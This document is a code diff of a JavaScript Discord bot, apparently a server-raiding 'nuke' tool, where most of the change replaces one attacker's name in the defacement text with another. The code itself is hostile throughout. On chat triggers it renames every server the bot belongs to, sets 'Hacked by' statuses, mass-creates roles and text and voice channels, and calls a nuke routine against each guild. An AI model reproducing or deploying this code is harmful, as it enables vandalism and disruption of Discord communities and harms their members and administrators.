@@ -40,13 +40,13 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/3
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked by Ath2b Faisall")
+LOka.user.setUsername("Hacked u by unknown Is here")
  
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked by Ath2b Faisall`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked by Ath2b Faisall`)
+             m.setName(`Hacked u by unknown Is here`)
 })
 }
 });
@@ -74,205 +74,211 @@ LOka.on('message', message => {
  
 }
 });
+ 
 LOka.on('message', message => {
      
  
      if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
      m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
     })
  
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "Hacked u by Ath2b Faisall",
         permissions :   [1],
-        color : " #ff0000"
+        color : " #cec5c5"
+    })
+    m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
+    })
+	m.createRole({
+        name : "Hacked u by Ath2b Faisall",
+        permissions :   [1],
+        color : " #cec5c5"
     })
  
  
@@ -285,53 +291,61 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
  
-m.createChannel('Hacked by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
  
-m.createChannel('Hacked by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
  
-m.createChannel('Hacked by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
  
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
  
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
  
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-
-m.createChannel('Hacked by Ath2b Faisall', 'text');
-m.createChannel('Hacked by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+ 
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
+m.createChannel('Hacked u by Ath2b Faisall', 'text');
  
 })
 }
@@ -340,67 +354,67 @@ m.createChannel('Hacked by Ath2b Faisall', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
  
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
  
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
  
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
  
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
-m.createChannel('Hacked by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+ 
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
+m.createChannel('Hacked u by Ath2b Faisall', 'voice');
  
  
  
@@ -438,9 +452,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked by Ath2b Faisall', 'text');
+    await guild.createChannel('Hacked u by Ath2b Faisall', 'text');
  
-      await guild.createChannel('Hacked by Ath2b Faisall', 'voice');
+      await guild.createChannel('Hacked u by Ath2b Faisall', 'voice');
  
  
  
@@ -476,7 +490,6 @@ LOka.on('guildMemberAdd', member => {
     });
  
    
- 
  
  
  
